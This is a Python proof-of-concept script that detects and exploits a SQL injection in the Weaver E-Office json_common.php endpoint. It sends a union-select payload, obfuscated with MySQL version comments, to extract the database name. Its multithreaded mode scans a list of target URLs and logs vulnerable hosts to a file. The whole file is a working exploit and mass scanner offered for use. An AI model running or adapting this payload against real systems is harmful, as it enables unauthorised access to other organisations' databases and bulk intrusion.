import requests,sys,argparse
from datetime import datetime
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 
                                                                                             
"""
    print(f"{banner}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')

def poc(check_url):
    now_poc = datetime.now()
    url = check_url + "/building/json_common.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = {
        'tfs': 'city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333'
    }
    try:
        respnose = requests.post(url,headers=headers,data=data,timeout=6,verify=False)
        if respnose.status_code == 200 and 'eoffice' in respnose.text :
            print(f'[+]{check_url}\t漏洞存在')
            save_file(check_url)
        else:
            print(f'[-]{check_url}\t漏洞不存在')

    except Exception as e:
        print(f'[-]{check_url}\t无法访问,请检查目标站点是否存在')


def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u

        poc(url)


if __name__ == '__main__':
    main()